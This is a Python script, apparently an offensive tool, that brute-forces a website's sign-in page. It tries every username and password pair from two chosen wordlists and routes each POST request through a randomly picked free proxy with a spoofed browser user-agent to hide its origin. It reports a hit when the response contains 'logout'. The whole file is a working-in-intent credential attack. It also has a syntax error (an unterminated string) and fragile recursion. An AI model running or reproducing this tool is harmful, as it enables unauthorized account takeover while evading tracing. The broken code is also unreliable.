import tkinter as tk
from tkinter import filedialog
import requests
from bs4 import BeautifulSoup
import random


def anon_browser(url):
    s = requests.session()
    req = s.get('http://spys.me/proxy.txt')
    proxy_page = BeautifulSoup(req.text, 'html.parser')
    a = str(proxy_page)
    x = a.splitlines()
    random_server = random.randrange(10, 85)
    proxy_server = (x[random_server].split()[0])
    proxy = {'https': '{}'.format(proxy_server)}
    print('[-] Trying to connect to: ' + str(proxy).split()[-1].strip('}').strip("'"))

    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ' \
                     'Chrome/80.0.3987.163 Safari/537.36 '
    headers = {'User-Agent': user_agent}

    try:
        req_proxy = s.post(url, proxies=proxy, headers=headers,data=payload)
        s.close()
        print('[+] Connected to: ' + str(proxy).split()[-1].strip('}').strip("'"))
        print(req_proxy.status_code)

        html_page = req_proxy.text

    except requests.exceptions.ProxyError:
        print('[!] Something Wrong trying again...\n')
        anon_browser(url)
    return html_page


def bruteforce(payload):
    url = input("Enter url og sign in page: )
    s = anon_browser(url)

    if "logout" in s:
        print("***** FOUND *****")
        print("[+] User name: {}\n[+] Password: {}\n".format(payload["email"], payload["password"]))

    else:
        print("[-] User name: {}\n[-] Password: {}\n".format(payload["email"], payload["password"]))


def main():
    root = tk.Tk()
    root.withdraw()
    global payload

    print("Chose a username file")
    path_to_user_list = filedialog.askopenfilename()

    print("Chose a password file\n")
    path_to_password_list = filedialog.askopenfilename()

    password_file = open(path_to_password_list, "r")
    password_list = password_file.read()
    password = password_list.splitlines()

    user_name_file = open(path_to_user_list, "r")
    user = user_name_file.read()
    first_user = user.splitlines()

    for i in range(len(first_user)):
        for x in range(len(password)):
            payload = {"email": first_user[i], "password": password[x]}
            bruteforce(payload)


if __name__ == '__main__':
    main()
